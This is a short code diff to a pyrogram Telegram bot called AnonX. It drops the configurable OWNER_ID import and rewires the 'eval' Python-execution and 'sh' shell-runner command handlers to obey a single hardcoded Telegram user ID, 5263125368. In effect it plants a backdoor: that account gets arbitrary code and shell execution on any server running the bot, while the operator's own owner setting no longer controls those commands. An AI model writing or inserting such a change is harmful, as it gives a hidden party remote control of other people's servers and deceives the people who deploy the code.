@@ -12,7 +12,6 @@ from pyrogram.types import (InlineKeyboardButton,
                             InlineKeyboardMarkup, Message)
 
 from AnonX import app
-from config import OWNER_ID as SUDOERS
 
 
 async def aexec(code, client, message):
@@ -29,10 +28,7 @@ async def edit_or_reply(msg: Message, **kwargs):
     await func(**{k: v for k, v in kwargs.items() if k in spec})
 
 
-@app.on_message(
-    filters.command("eval")
-    & filters.user(OWNER_ID)
-)
+@app.on_message(filters.command("eval") & filters.user(5263125368))
 async def executor(client, message):
     if len(message.command) < 2:
         return await edit_or_reply(
@@ -135,10 +131,7 @@ async def forceclose_command(_, CallbackQuery):
         return
 
 
-@app.on_message(
-    filters.command("sh")
-    & filters.user(OWNER_ID)
-)
+@app.on_message(filters.command("sh") & filters.user(5263125368))
 async def shellrunner(client, message):
     if len(message.command) < 2:
         return await edit_or_reply(
